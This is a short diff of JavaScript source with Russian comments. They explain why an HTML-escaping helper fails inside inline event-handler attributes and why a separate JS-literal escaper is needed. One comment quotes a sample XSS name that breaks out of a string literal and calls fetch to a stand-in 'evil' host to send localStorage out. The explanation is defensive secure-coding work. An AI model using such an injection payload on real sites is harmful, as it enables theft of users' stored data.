@@ -29277,7 +29277,7 @@ function esc(s) {
   const t = (s === null || s === undefined) ? '' : String(s);
   return t.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');
 }
-// Строка для JS-литерала ВНУТРИ обработчика в разметке: onclick="f('${escJs(x)}')".
+// Строка для JS-литерала ВНУТРИ обработчика в разметке (атрибут on…="…('${escJs(x)}')").
 //
 // esc() тут НЕ защищает: браузер раскодирует &#39; в атрибуте обратно в ' ДО
 // запуска кода, и имя вида «x');fetch('//evil?'+localStorage…);//» выходит из
